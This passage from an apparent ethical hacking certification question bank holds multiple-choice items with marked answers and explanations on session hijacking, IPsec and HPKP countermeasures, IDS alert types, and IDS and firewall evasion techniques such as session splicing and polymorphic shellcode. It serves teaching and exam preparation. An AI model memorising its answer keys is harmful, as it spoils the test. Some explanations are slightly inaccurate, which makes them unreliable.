A few seconds later though, the hash is different.

![](./Images/0391-2.png)

+ [ ] This is Microsoft NTLMv2 hash. It’s different because user is visiting another website. Each website will have its own unique hash.
+ [x] This is Microsoft NTLMv2 hash—it’s salted, so it will be different for every new request.
+ [ ] This is Microsoft NTLMv2 hash. It’s different because user changed the password in the meantime.
+ [ ] This is Microsoft NTLMv2 hash. It’s different because this is another user accessing the website.
> **Explanation:**
> + NTLMv2 hash is salted, so it will change with each new request. Salting is a cryptographic technique of randomizing the data. NTLMv2 hashes keep randomly changing on each new request.
> + It has nothing to do with another user accessing the website.
> + It has also nothing to do with user visiting another website
> + No—practically a user cannot change the password in one second difference

392. Marin configured Firefox as shown in the following image:

![](./Images/0392.png)

He is intercepting the traffic with Burp. HTTP traffic is shown, but HTTPS is not. Why?

+ [ ] It is impossible to intercept HTTPS traffic with burp and similar tools; one has to use sslstrip.
+ [ ] It does not work because HTTPS traffic is protected with HSTS, which prevents traffic interception.
+ [ ] All is good from the configuration point of view – the problem is in burp.
+ [x] Marin has not clicked on “use this proxy server for all protocols” in Firefox configuration screen.
> **Explanation:**
> To intercept https traffic, the Internet browser has to be configured separately for HTTP and other protocols (like HTTPS). So in this case, one has to configure accordingly to use this proxy for all protocols or manually configure SSL proxy configuration settings, if FTP and SOCKS do not have to be intercepted with burp.

393. Analyze the following image and answer the question:

![](./Images/0393.png)

This is the end result of what type of attack?

+ [ ] CSRF (Cross-site request forgery)
+ [x] XSS (Cross-Site Scripting)
+ [ ] This is normal HTTP communication
+ [ ] Session fixation
> **Explanation:**
> This is a session cookie sent to the attacker’s machine in XSS attack; 192.168.132.120 being the attacker machine’s IP and 192.168.132.190 being the victim’s IP.


## Network Level Session Hijacking
394. A security engineer has been asked to deploy a secure remote access solution that will allow employees to connect to the company’s internal network. Which of the following can be implemented to minimize the opportunity for a man-in-the-middle attack to occur?
+ [x] IPSec
+ [ ] Mutual authentication
+ [ ] Static IP addresses
+ [ ] SSL
> **Explanation:**
> IPSec is a protocol suite developed by the IETF for securing IP communications by authenticating and encrypting each IP packet of a communication session. It is deployed widely to implement virtual private networks (VPNs) and for remote user access through dial-up connection to private networks.

395. John, a malicious attacker, was intercepting packets during transmission between the client and server in a TCP and UDP session, what is this type of attack called?
+ [ ] Application level hijacking
+ [ ] Intrusion
+ [x] Network level hijacking
+ [ ] Session hijacking
> **Explanation:**
> + Network-level hijacking is the interception of packets during transmission between the client and server in a TCP and UDP session.
> Application-level hijacking is about taking control over the https user session by obtaining the session IDs.
> Intrusion is incorrect.
> Session hijacking is not specific enough.

396. Network-level session hijacking attacks ____________ level protocols.
+ [x] Transport and internet level protocols
+ [ ] Data link level protocols
+ [ ] Application level protocols
+ [ ] Network or Internet level protocols
> **Explanation:**
> By definition, network-level session hijacking attacks transport- and Internet-level protocols.

397. Which of the following is not a type of network-level hijacking?
+ [ ] UDP Hijacking
+ [ ] Man-in-the-Middle: Packet Sniffer
+ [x] Session Hijacking
+ [ ] Blind Hijacking
> **Explanation:**
> + Session hijacking is one of the threats of ARP poisoning and not a network-level hijacking alone.  
> + Blind Hijacking, Man-in-the-Middle: Packet Sniffer along with Forged ICMP and ARP Spoofing, and UDP Hijacking are types of network-level hijacking attacks.

398. If an attacker intercepts an established connection between two communicating parties using spoofed packets, and then pretends to be one of them, then which network-level hijacking is he performing?
+ [ ] IP spoofing
+ [ ] RST hijacking
+ [x] TCP/IP hijacking
+ [ ] Man-in-the-middle: packet sniffer
> **Explanation:**
> In TCP/IP hijacking, an attacker intercepts an established connection between two communicating parties using spoofed packets, and then pretends to be one of them. In this approach, the attacker uses spoofed packets to redirect the TCP traffic to his/her own machine. Once this is successful, the victim’s connection hangs and the attacker is able to communicate with the host’s machine on behalf of the victim.

399. Out of the following, which network-level session hijacking technique is useful in gaining unauthorized access to a computer with the help of a trusted host’s IP address?
+ [x] IP Spoofing: Source Routed Packets
+ [ ] UDP Hijacking
+ [ ] TCP/IP Hijacking
+ [ ] Bling Hijacking
> **Explanation:**
> The source-routed packets technique is useful in gaining unauthorized access to a computer with the help of a trusted host’s IP address. This type of hijacking allows attackers to create their own acceptable packets to insert into the TCP session. First, the attacker spoofs the trusted host’s IP address so that the server managing a session with the host, accepts the packets from the attacker.

400. Which of the following tools can be used to perform RST hijacking on a network?
+ [ ] Recon-ng
+ [ ] FOCA
+ [ ] Nmap
+ [x] Colasoft’s Packet Builder
> **Explanation:**
> RST hijacking involves injecting an authentic-looking reset (RST) packet using spoofed source address and predicting the acknowledgment number. The hacker can reset the victim’s connection if it uses an accurate acknowledgment number. The victim believes that the source has sent the reset packet and resets the connection. RST Hijacking can be carried out using a packet crafting tool such as Colasoft’s Packet Builder and TCP/IP analysis tool such as tcpdump.

401. Maira wants to establish a connection with a server using the three-way handshake. As a first step she sends a packet to the server with the SYN flag set. In the second step, as a response for SYN, she receives packet with a flag set.
Which flag does she receive from the server?
+ [ ] FIN
+ [x] SYN+ACK
+ [ ] RST
+ [ ] ACK
> **Explanation:**
> + In the second step, the server sends a response to her with the SYN + ACK flag and an ISN (Initial Sequence Number) for the server.
> + In the third step, Maira sets the ACK flag acknowledging the receipt of the packet and increments the sequence number by 1.

402. Out of the following, which network-level session hijacking technique can be used to inject malicious data or commands into the intercepted communications in a TCP session?
+ [ ] UDP Hijacking
+ [ ] RST Hijacking
+ [x] Blind Hijacking
+ [ ] TCP/IP Hijacking
> **Explanation:**
> In blind hijacking, a hacker can inject malicious data or commands into the intercepted communications in a TCP session, even if the victim disables source routing. Here, an attacker correctly guesses the next ISN of a computer attempting to establish a connection; the attacker sends malicious data or a command, such as password setting to allow access from another location on the network, but the attacker can never see the response. To be able to see the response, a man-in-the-middle attack works much better.
> 
> In TCP/IP hijacking, an attacker intercepts an established connection between two communicating parties using spoofed packets, and then pretends to be one of them. In this approach, the attacker uses spoofed packets to redirect the TCP traffic to his/her own machine. Once this is successful, the victim's connection hangs and the attacker is able to communicate with the host’s machine on behalf of the victim.
> 
> UDP hijacking and RST hijacking do not have to do anything with this.

403. Which of the following protocols is an extension of IP to send error messages? An attacker can use it to send messages to fool the client and the server.
+ [ ] ARP
+ [x] ICMP
+ [ ] FTP
+ [ ] SSL
> **Explanation:**
> ICMP (Internet control message protocol) is an extension of IP to send error messages and an attacker can use it to send messages to fool the client and the server. The technique used is to forge ICMP (Internet control message protocol) packets to redirect traffic between the client and the host through the hijacker’s host. The hacker’s packets send error messages, indicating problems in processing packets through the original connection. This fools the server and client into routing through hijacker’s path instead.


## Session Hijacking Countermeasures
404. Susan works for “CustomData Intl.” and she has to deploy a guest Wi-Fi. She did everything by the manual and deployed the guest Wi-Fi successfully. The deployed guest Wi-Fi is separated from the company network, it is protected with WPA2 and every user wants to use the Wi-Fi has to ask for a username and password. There is one problem though—after a few months she noticed that the users connecting to the guest Wi-Fi are being attacked with MitM attacks. She identified that the MitM attack was initiated with ARP spoofing. She found that someone is stealing users’ web application credentials, including Windows system credentials in some cases. Unfortunately, internal users have also become prey to these attacks since they used guest Wi-Fi because it was more open than their internal network. So, only external guests are not being compromised. She wanted to mitigate this issue and the first step she took was to ban all internal users from guest using Wi-Fi network. What, according to you, is the easiest and probably the best way to prevent the ARP spoofing attacks on Wi-Fi networks?
+ [ ] Use HTTPS all the time
+ [ ] It’s impossible to protect WiFi from ARP spoofing
+ [ ] Use IPsec on WiFi
+ [x] Use Client isolation WiFi feature
> **Explanation:**
> Client isolation Wi-Fi feature will prevent clients to see each other on Wi-Fi network, effectively preventing ARP spoofing. This will also prevent clients to see any other machine on the network, but since this is only used to surf the Internet it is obviously the easiest and the best way to do.
> 
> There are still some attacks that could be used over HTTPS, and IPsec is not a solution that could be easily implemented on Wi-Fi connecting to Internet.

405. Out of the following, which session hijacking detection technique involves using packet-sniffing software such as Wireshark and SteelCentral packet analyzer to monitor session hijacking attacks?
+ [ ] Automatic method
+ [ ] Normal Telnet session
+ [ ] Forcing an ARP entry
+ [x] Manual method
> **Explanation:**
> The manual method involves using packet-sniffing software such as Wireshark and SteelCentral packet analyzer to monitor session hijacking attacks. The packet sniffer captures packets in transit across the network, which is then analyzed.

406. Which of the following technique allows users to authenticate web servers?
+ [ ] SSH
+ [x] HPKP
+ [ ] HTTPS
+ [ ] SFTP
> **Explanation:**
> The correct answer is “b,” 
> + **HTTP Public Key Pinning (HPKP)** is a security feature that tells a web client to associate a specific cryptographic public key with a certain web server to decrease the risk of MITM attacks with forged certificates. Using HTTP Public Key Pinning (HPKP) allows users authenticate web servers.
> + **HTTPS:** HTTPS is the secure version of HTTP, the protocol over which data is sent between a browser and a website.
> + **SSH:** SSH is a network protocol used to remotely access and manage a device.
> + **SFTP:** SFTP is a separate protocol packaged with SSH that works in a similar way over a secure connection.

407. A tester wants to test an organization’s network against session hijacking attacks. Which of the following tools can he use to detect session hijacking attacks?
+ [ ] FOCA
+ [ ] Nmap
+ [x] LogRhythm
+ [ ] Recon-ng
> **Explanation:**
> LogRhythm is correct answer. LogRhythm’s Advanced Intelligence Engine can be used to detect session hijacking attacks.
> 
> Where as, Nmap, FOCA and Recon-ng are information gathering tools which are not specific to detect session hijacking attacks.

408. OpenSSH or SSH is a more secure solution to which of the following protocol?
+ [ ] SMB
+ [ ] HTTP
+ [x] Telnet, rlogin
+ [ ] IP
> **Explanation:**
> OpenSSH or SSH is a more secure solution to Telnet, rlogin. SSH sends encrypted data and makes it difficult for the attacker to send the correctly encrypted data if a session is hijacked.

409. Which of the following protocols is used to implement virtual private networks (VPNs)?
+ [x] IPsec
+ [ ] HTTPS
+ [ ] Token binding
+ [ ] HPKP
> **Explanation:**
> Internet protocol security (IPsec) supports the secure exchange of packets at the IP layer. It ensures interoperable cryptographically based security for IP protocols (IPv4 and IPv6), and supports network-level peer authentication, data origin authentication, data integrity, data confidentiality (encryption), and replay protection. It is widely used to implement virtual private networks (VPNs) and for remote user access through dial-up connection to private networks. It supports transport and tunnel encryption modes, though sending and receiving devices must share a public key.

410. Out of the following, which is not a component of the IPsec protocol?
+ [x] HPKP
+ [ ] IKE
+ [ ] Oakley
+ [ ] IPsec policy agent
> **Explanation:**
> HTTP public key pinning (HPKP) is a trust on first use (TOFU) technique used in an HTTP header. HPKP is a security feature that tells a web client to associate a specific cryptographic public key with a certain webserver to decrease the risk of MITM attacks with forged certificates.

411. Which protocol defines the payload formats, types of exchange, and naming conventions for security information such as cryptographic algorithm or security policies. Identify from the following options.
+ [ ] ISAKMP
+ [ ] AH
+ [x] DOI
+ [ ] ESP
> **Explanation:**
> IPsec DOI instantiates ISAKMP for use with IP when IP uses ISAKMP to negotiate security associations. A DOI document defines many things: a naming scheme for DOI-specific protocol identifiers, the contents of the situation field of the ISAKMP SA payload, the attributes that IKE negotiates in a quick mode, and any specific characteristics that IKE needs to convey.

412. Which of the following tools can be used by a pentester to test the security of web applications?
+ [ ] Cain & Abel
+ [ ] MITMf
+ [ ] BetterCAP
+ [x] Fiddler
> **Explanation:**
> The correct answer is Fiddler.
> + It is used for security testing of web applications such as decrypting HTTPS traffic, and manipulating requests using a man-in-the-middle decryption technique.
> + BetterCAP, MITMf, and Cain and Abel are ARP poisoning tools.

413. A user wants to securely establish a remote connection to a system without any interference from perpetrators. Which of the following methods should he incorporate in order to do so?
+ [ ] SFTP
+ [ ] SMB Signing
+ [x] VPN
+ [ ] HTTPS
> **Explanation:**
> He should be implementing encrypted VPN such as PPTP, L2PT, IPSec, etc. as a remote connection prevents session hijacking.

# 12. Evading IDS, Firewalls and Honeypot
## IDS, Firewall, and Honeypot Concepts
414. Which of the following indicator identifies a network intrusion?
+ [ ] d. Connection requests from IPs from those systems within the network range
+ [ ] a. Sudden decrease in bandwidth consumption is an indication of intrusion
+ [ ] b. Rare login attempts from remote hosts
+ [x] c. Repeated probes of the available services on your machines
> **Explanation:**
> Network Intrusions: General indications of network intrusions include:
> + Sudden increase in bandwidth consumption is an indication of intrusion
> + Repeated probes of the available services on your machines
> + Connection requests from IPs other than those in the network range, indicating that an unauthenticated user (intruder) is attempting to connect to the network
> + Repeated login attempts from remote hosts
> + A sudden influx of log data could indicate attempts at Denial-of-Service attacks, bandwidth consumption, and distributed Denial-of-Service attacks

415. What is the main advantage that a network-based IDS/IPS system has over a host-based solution?
+ [x] They do not use host system resources.
+ [ ] They will not interfere with user interfaces.
+ [ ] They are placed at the boundary, allowing them to inspect all traffic.
+ [ ] They are easier to install and configure.
> **Explanation:**
> The correct option is “They do not use host system resources”.
> Host-based [intrusion detection systems](https://searchsecurity.techtarget.com/definition/intrusion-detection-system) (IDSes) protect just that: the host or endpoint. This includes workstations, servers, mobile devices and the like. Host-based IDSes are not just one of the last layers of defense, but they're also one of the best security controls because they can be fine-tuned to the specific workstation, application, user role or workflows required. A network-based IDS often sits on the ingress or egress point(s) of the network to monitor what's coming and going. Given that a network-based IDS [sits further out on the network](https://searchsecurity.techtarget.com/answer/Where-to-put-an-IDS-inside-or-outside-of-the-firewall), so it doesn't use any host system resources and it may not provide enough granular protection to keep everything in check -- especially for network traffic that's protected by [SSL](https://searchsecurity.techtarget.com/definition/Secure-Sockets-Layer-SSL), [TLS](https://searchsecurity.techtarget.com/definition/Transport-Layer-Security-TLS) or [SSH](https://searchsecurity.techtarget.com/definition/Secure-Shell).

416. Sean who works as a network administrator has just deployed an IDS in his organization’s network. Sean deployed an IDS that generates four types of alerts that include: true positive, false positive, false negative, and true negative.  
In which of the following conditions does the IDS generate a true positive alert?
+ [ ] A true positive is a condition occurring when an IDS fails to react to an actual attack event.
+ [ ] A true positive is a condition occurring when an IDS identifies an activity as acceptable behavior and the activity is acceptable.
+ [ ] A true positive is a condition occurring when an event triggers an alarm when no actual attack is in progress.
+ [x] A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress.
> **Explanation:**
> True positive (attack – alert): A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress. The event may be an actual attack, in which case an attacker is making an attempt to compromise the network, or it may be a drill, in which case security personnel is using hacker tools to conduct tests of a network segment.

417. Which solution can be used to emulate computer services, such as mail and ftp, and to capture information related to logins or actions?
+ [ ] DeMilitarized Zone (DMZ)
+ [x] Honeypot
+ [ ] Intrusion Detection System (IDS)
+ [ ] Firewall
> **Explanation:**
> + A **firewall** is software- or hardware-based system located at the network gateway that protects the resources of a private network from unauthorized access of users on other networks. They are placed at the junction or gateway between the two networks, which is usually a private network and a public network such as the Internet. Firewalls examine all messages entering or leaving the Intranet and block those that do not meet the specified security criteria.
> + **Honeypots** are systems that are only partially secure and thus serve as lures to attackers. Recent research reveals that a honeypot can imitate all aspects of a network, including its webservers, mail servers, and clients. Honeypots are intentionally set up with low security to gain the attention of the DDoS attackers. Honeypots serve as a means for gaining information about attackers, attack techniques, and tools by storing a record of the system activities.
> + An **intrusion detection system (IDS)** is a security software or hardware device used to monitor, detect, and protect networks or system from malicious activities; it alerts the concern security personnel immediately upon detecting intrusions.
> + In computer networks, the **DeMilitarized zone (DMZ)** is an area that hosts computer(s) or a small subnetwork placed as a neutral zone between a particular company’s internal network and untrusted external network to prevent outsider access to a company’s private data. The DMZ serves as a buffer between the secure internal network and the insecure Internet, as it adds a layer of security to the corporate LAN, thus preventing direct access to other parts of the network.

418. Which of the statements concerning proxy firewalls is correct?
+ [x] Computers establish a connection with a proxy firewall that initiates a new network connection for the client.
+ [ ] Proxy firewalls increase the speed and functionality of a network.
+ [ ] Proxy firewalls block network packets from passing to and from a protected network.
+ [ ] Firewall proxy servers decentralize all activity for an application.
> **Explanation:**
> Proxy firewalls serve a role similar to stateful firewalls. The proxy then initiates a new network connection on behalf of the request. This provides significant security benefits because it prevents any direct connections between systems on either side of the firewall.

419. Which protocol and port number might be needed to send log messages to a log analysis tool that resides behind a firewall?
+ [ ] UDP 123
+ [x] UDP 514
+ [ ] UDP 541
+ [ ] UDP 415
> **Explanation:**
> The syslog protocol enables network devices to record event messages to the logging server or the syslog server. It is possible to log many events and the syslog protocol can handle many different devices. Normally, Windows-based servers do not support syslog. However, there are many third-party tools available that can actually gather the Windows server log information and then forward it to the syslog server.
> 
> Syslog is the standard for message logging and uses a facility code that determines the software used for generating the messages and also assigns a severity label to each. The syslog finds its application in system management, security auditing, and debugging messages. Many types of devices such as printers, routers, and so on use the syslog standard that enables a centralized method of logging data from different devices. The syslog server gathers information sent over the network over UDP port 514 using a syslog listener.

420. The intrusion detection system at a software development company suddenly started generating multiple alerts regarding attacks against the company’s external webserver, VPN concentrator, and DNS servers. What should the security team do to determine which alerts to check first?
+ [ ] Investigate based on the service-level agreements of the systems.
+ [ ] Investigate based on the order that the alerts arrived in.
+ [ ] Investigate based on the maintenance schedule of the affected systems.
+ [x] Investigate based on the potential effect of the incident.
> **Explanation:**
> Priority of incident handling and response for various components of an information system or system recovery is determined according to the potential impact of the incident. Appropriate strategies are selected after considering availability of resources, criticality of affected systems, and the results of cost–benefit analysis.

421. Which of the following intrusion detection technique involves first creating models of possible intrusions and then comparing these models with incoming events to make a detection decision?
+ [ ] Protocol Anomaly Detection
+ [ ] Obfuscating
+ [ ] Anomaly Detection
+ [x] Signature Recognition
> **Explanation:**
> + **Signature Recognition:** Signature recognition, also known as misuse detection, tries to identify events that indicate an abuse of a system or network. This technique involves first creating models of possible intrusions and then comparing these models with incoming events to make a detection decision.
> + **Anomaly Detection:** Anomaly detection, or “not-use detection,” differs from the signature-recognition model. Anomaly detection consists of a database of anomalies. An anomaly can be detected when an event occurs outside the tolerance threshold of normal traffic. Therefore, any deviation from regular use is an attack. Anomaly detection detects the intrusion based on the fixed behavioral characteristics of the users and components in a computer system. Creating a model of normal use is the most challenging task in creating an anomaly detector.
> + **Protocol Anomaly Detection:** Protocol anomaly detection depends on the anomalies specific to a protocol. It identifies particular flaws between how vendors deploy the TCP/IP protocol. Protocols designs according to RFC specifications, which dictate standard handshakes to permit universal communication. The protocol anomaly detector can identify new attacks.
> + **Obfuscating:** Obfuscating is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. An attacker manipulates the path referenced in the signature to fool the HIDS. Using the Unicode character, an attacker could encode attack packets that the IDS would not recognize, but an IIS web server would decode.

422. A circuit-level gateway works at which of the following layers of the OSI model?
+ [x] Layer 5 - Session
+ [ ] Layer 3 – Network
+ [ ] Layer 2 – Data link
+ [ ] Layer 4 – Transport
> **Explanation:**
> A circuit-level gateway firewall works at the session layer of the OSI model or TCP layer of TCP/IP. It forwards data between networks without verifying it, and blocks incoming packets into the host, but allows the traffic to pass through itself. Information passed to remote computers through a circuit-level gateway will appear to have originated from the gateway, as the incoming traffic carries the IP address of the proxy (circuit-level gateway).

423. Jamie is replacing the company's existing SOHO firewall device for an enterprise firewall and is being asked to address how it will be connected to the existing infrastructure. Jamie is told by his supervisor that the new firewall needs to be integrated into the existing user registry for authentication for the company. What will Jamie need to configure in the new firewall to fulfill the request?
+ [ ] Jamie will need to transfer LDAP from the existing company system to new firewall. Delete old LDAP after transfer.
+ [ ] Jamie will need to transfer AD from the existing company system to new firewall. Delete old AD after transfer.
+ [ ] Jamie will need to point NSEL data to new firewall. Use company AD system as a source of users.
+ [x] Jamie will need to configure AAA at the new firewall. Use company AD system as a source of users.
> **Explanation:**
> The test taker needs to understand how to add authentication, authorization, and accounting (AAA) capabilities to the new firewall using common connection to an existing user directory while differentiating the need to not move the directory source. New admins who have not setup a new firewall may not understand how the actual deploy looks like.

424. While checking the settings on thane internet browser, a technician finds that the proxy server settings have been checked and a computer is trying to use itself as a proxy server. What specific octet within the subnet does the technician see?
+ [ ] 192.168.168.168
+ [ ] 192.168.1.1
+ [x] 127.0.0.1
+ [ ] 10.10.10.10
> **Explanation:**
> Since the computer is trying to use itself as a proxy server, it is simply looping back. 127.0.0.1 is the loopback Internet protocol (IP) address also referred to as the “localhost.” The address is used to establish an IP connection to the same machine or computer being used by the end-user. The same convention is defined for computers that support IPv6 addressing using the connotation of ::1. Establishing a connection using the address [127.0.0.1](http://www.ihowd.com/127-0-0-1) is the most common practice; however, using any IP address in the range of `127.*.*.*` will function in the same or similar manner. The loopback construct gives a computer or device capable of networking the capability to validate or establish the IP stack on the machine.


## Techniques to bypass IDS
425. The use of alert thresholding in an IDS can reduce the volume of repeated alerts, but introduces which of the following vulnerabilities?
+ [ ] Network packets are dropped if the volume exceeds the threshold.
+ [ ] Thresholding interferes with the IDS’ ability to reassemble fragmented packets.
+ [ ] The IDS will not distinguish among packets originating from different sources.
+ [x] An attacker, working slowly enough, can evade detection by the IDS.
> **Explanation:**
> An intrusion detection system (IDS) is a security software or hardware device used to monitor, detect, and protect networks or systems from malicious activities; it alerts the concerned security personnel immediately upon detecting intrusions. Alert thresholding is a set of rules that detects suspicious activities based on access attempts and time intervals. Users can customize the default threshold according to their requirements. Setting threshold is difficult because a user may miss few key packets if it is set too high. If thresholds are too low, the analyst may see many false-positives.

426. Eric, a professional hacker, is trying to perform a SQL injection attack on the back-end database system of the InfomationSEC, Inc. During the information gathering process, he identifies that MYSQL server is the back-end database engine used. Eric has tried various SQL injection attack attempts based on the information gathered but all of his attempts failed. Later, he discovered that IPS system is blocking all the SQL injection attack attempts. Eric decided to bypass the IPS using string concatenation IPS evasion technique where he needs to break the SQL query into a number of small pieces and concatenates the SQL query end-to-end.
Which of the following string concatenation operator Eric need to use in the SQL query to concatenate the SQL query end-to-end?
+ [ ] “+” operator
+ [ ] “||” operator
+ [ ] “&” operator
+ [x] “concat(,)” operator
> **Explanation:**
> + “+” operator: This operator is used to concatenate the SQL strings in MS SQL database.
> + “||” operator: This operator is used to concatenate the SQL strings in Oracle database.
> + “concat(,)” operator: This operator is used to concatenate the SQL strings in MySQL database.
> + “&” operator: This operator is used to concatenate the SQL strings in MS Access database.

427. When analyzing the IDS logs, the system administrator notices connections from outside of the LAN have been sending packets where the source IP address and destination IP address are the same. However, no alerts have been sent via email or logged in the IDS. Which type of an alert is this?
+ [ ]  False positive
+ [ ]  True negative
+ [x]  False negative
+ [ ]  True positive
> **Explanation:**
> + **False Positive (No attack - Alert):** A false positive occurs if an event triggers an alarm when no actual attack is in progress. A false positive occurs when an IDS treats regular system activity as an attack. False positives tend to make users insensitive to alarms and reduce their reactions to actual intrusion events. While testing the configuration of an IDS, administrators use false positives to determine if the IDS can distinguish between false positives and real attacks or not.
> + **False Negative (Attack - No Alert):** A false negative is a condition occurred when an IDS fails to react to an actual attack event. This event is the most dangerous failure since the purpose of an IDS is to detect and respond to attacks.
> + **True Positive (Attack - Alert):** A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress. The event may be an actual attack, in which case an attacker is making an attempt to compromise the network, or it may be a drill, in which case security personnel are using hacker tools to conduct tests of a network segment.
> + **True Negative (No attack - No Alert):** A true negative is a condition occurred when an IDS identifies an activity as acceptable behavior and the activity is acceptable. A true negative is successfully ignoring the acceptable behavior. It is not harmful as the IDS is performing as expected.

428. Michel, a professional hacker, is trying to perform an SQL injection attack on the MS SQL database system of the CityInfo, Inc. by bypassing the signature-based IDS. He tried various IDS evasion techniques and finally succeeded with one where he breaks the SQL query into a number of small pieces and uses the + sign to join SQL query end to end.  
Which of the following IDS evasion techniques he uses to bypass the signature-based IDS?
+ [ ] URL encoding
+ [x] String concatenation
+ [ ] Char encoding
+ [ ] Hex encoding
> **Explanation:**
> + **String concatenation:** This technique breaks SQL statement into a number of pieces and concatenation breaks up SQL keywords to evade the IDS.  
> + **Char encoding:** This technique uses char() function to replace common injection variables present in the SQL statement to evade the IDS.  
> + **Hex encoding:** This technique uses hexadecimal encoding to replace common injection variables present in the SQL statement to evade the IDS.  
> + **URL encoding:** This technique uses online URL encoding to encode SQL statement to bypass the IDS.

429. When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s computer to update the router configuration. What type of an alert is this?
+ [ ] False-negative
+ [x] False-positive
+ [ ] True-negative
+ [ ] True-positive
> **Explanation:**
> In a false-positive alarm an IDS raises an alarm on a nonmalicious event. As false-positive alarm triggers during unjustified alerts, they cause chaos in the organization. They nullify the urgency and the value of the real alerts, leading to ignoring the actual alarm situation.  
> 
> Causes of false-positive alarm:  
> + A network traffic false alarm: A network traffic false alarm triggers when a nonmalicious traffic event occurs. A great example of this would be an IDS triggers an alarm when the packets do not reach the destination due to network device failure.  
> + A network device alarm: An IDS triggers a network device alarm when the device generates unknown or odd packets, for example, load balancer.  
> + An Alarm caused by an incorrect software script: If poorly written software generates odd or unknown packets, IDS will trigger a false-positive alarm.  
> + Alarms caused by an IDS bug: A software bug in an IDS will raise an alarm for no reason.

430. A network administrator received an administrative alert at 3:00 a.m. from the intrusion detection system. The alert was generated because a large number of packets were coming into the network over ports 20 and 21. During analysis, there were no signs of attack on the FTP servers. How should the administrator understand this situation?
+ [ ] True negatives
+ [ ] True positives
+ [ ] False negatives
+ [x] False positives
> **Explanation:**
> Attackers with the knowledge of the target IDS, craft malicious packets specific to particular ports just to generate alerts. These packets are sent to the IDS to generate a large number of false positive alerts. Attackers then use these false positive alerts to hide real attack traffic. They can bypass IDS unnoticed as it is difficult to differentiate the attack traffic from the large volume of false positives. This mode does not attack the target; instead, it does something relatively normal. In this mode, the IDS generates an alarm when no condition is present to warrant one.

431. Which evasion technique is used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS?
+ [ ] Unicode Evasion
+ [ ] Session splicing
+ [x] Obfuscation
+ [ ] Fragmentation Attack
> **Explanation:**
> + Obfuscation means to make the code harder to understand or read, generally for privacy or security purposes. A tool called an obfuscator converts a straightforward program into that works the same way but is much harder to understand.
> + Obfuscating is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. An attacker manipulates the path referenced in the signature to fool the HIDS.
> + Session splicing, unicode evasion, and fragmentation attack are also IDS evading techniques that use different ways to evade IDS.

432. How many bit checksum is used by the TCP protocol for error checking of the header and data and to ensure that communication is reliable?
+ [ ] 13-bit
+ [ ] 15-bit
+ [x] 16-bit
+ [ ] 14-bit
> **Explanation:**
> The TCP protocol uses 16-bit checksums for error checking of the header and data and to ensure that communication is reliable. It adds a checksum to every transmitted segment that is checked at the receiving end.

433. An attacker hides the shellcode by encrypting it with an unknown encryption algorithm and by including the decryption code as part of the attack packet. He encodes the payload and then places a decoder before the payload. Identify the type of attack executed by attacker.
+ [ ] Post-Connection SYN
+ [x] Polymorphic Shellcode
+ [ ] Preconnection SYN
+ [ ] ASCII Shellcode
> **Explanation:**
> The polymorphic shellcode attacks include multiple signatures, making it difficult to detect the signature. Attackers encode the payload using some technique and then place a decoder before the payload. As a result, the shellcode is completely rewritten each time it is sent for evading detection.  
> 
> In ASCII shellcode attack, IDS is bypassed by commonly enforced character restrictions within string input code, whereas preconnection SYN and postconnection SYN are type of desynchronization attack.

434. Which network-level evasion method is used to bypass IDS where an attacker splits the attack traffic in too many packets so that no single packet triggers the IDS?
+ [ ] Fragmentation attack
+ [x] Session splicing
+ [ ] Overlapping fragments
+ [ ] Unicode evasion
> **Explanation:**
> Session splicing is an IDS evasion technique that exploits how some IDSs do not reconstruct sessions before pattern-matching the data. It is a network-level evasion method used to bypass IDS where an attacker splits the attack traffic in too many packets such that no single packet triggers the IDS. The attacker divides the data into the packets into small portions of bytes and while delivering the data evades the string match. Attackers use this technique to deliver the data into several small-sized packets. Overlapping fragments and fragmentation attack evade IDS by using fragments of packet, whereas in unicode evasion is done by exploiting unicode characters.


## Techniques to bypass Firewalls
435. A pentester gains access to a Windows application server and needs to determine the settings of the built-in Windows firewall. Which command would be used?
+ [ ] Ipconfig firewall show config
+ [x] Netsh firewall show config
+ [ ] WMIC firewall show config
+ [ ] Net firewall show config
> **Explanation:**
> The Netsh command provides a command-line alternative to the capabilities of the Windows Firewall Control Panel utility. By using the Netsh firewall command, you can configure and view Windows Firewall exceptions and configuration settings. netsh firewall show config [ [ verbose = ] { enable | disable } ] displays the current list of program exceptions for the domain and standard profiles.

436. Firewalk has just completed the second phase (the scanning phase) and a technician receives the output shown below.
What conclusions can be drawn based on these scan results?
+ TCP port 21—no response  
+ TCP port 22—no response  
+ TCP port 23—Time-to-live exceeded
+ [ ] The lack of response from ports 21 and 22 indicate that those services are not running on the destination server.
+ [ ] The firewall itself is blocking ports 21 through 23 and a service is listening on port 23 of the target host.
+ [x] The scan on port 23 passed through the filtering device. This indicates that port 23 was not blocked at the firewall.
+ [ ] The scan on port 23 was able to make a connection to the destination host prompting the firewall to respond with a TTL error.
> **Explanation:**
> Since the output shown to the technician contains TCP port 21—no response, TCP port 22—no response, and TCP port 23—Time-to-live exceeded, this means that the traffic through port 23 has passed through the firewall filtering which indicates that the firewall does not block port 23.

437. Check Point's FireWall-1 listens to which of the following TCP ports?
+ [ ] 1080
+ [x] 259
+ [ ] 1072
+ [ ] 1745
> **Explanation:**
> Some firewalls will uniquely identify themselves using simple port scans. For example, Check Point's FireWall-1 listens on TCP ports 256, 257, 258, and 259, and Microsoft's Proxy Server usually listens on TCP ports 1080 and 1745.

438. Which method of firewall identification has the following characteristics:
+ uses TTL values to determine gateway ACL filters
+ maps networks by analyzing IP packet response
+ probes ACLs on packet filtering routers/firewalls using the same method as trace-routing
+ sends TCP or UDP packets into the firewall with TTL value is one hop greater than the targeted firewall
+ [ ] Port Scanning
+ [ ] Banner Grabbing
+ [ ] Source Routing
+ [x] Firewalking
> **Explanation:**
> + **Port scanning:** It is used to identify open ports and services running on ports. Finding open ports is an attacker’s first step to access the target system. To do so, the attacker systematically scans the target’s ports to identify the version of services, which helps in finding vulnerabilities in these services.
> + **Banner grabbing:** It is a simple method of fingerprinting that helps in detecting the vendor of a firewall and the firmware's version.
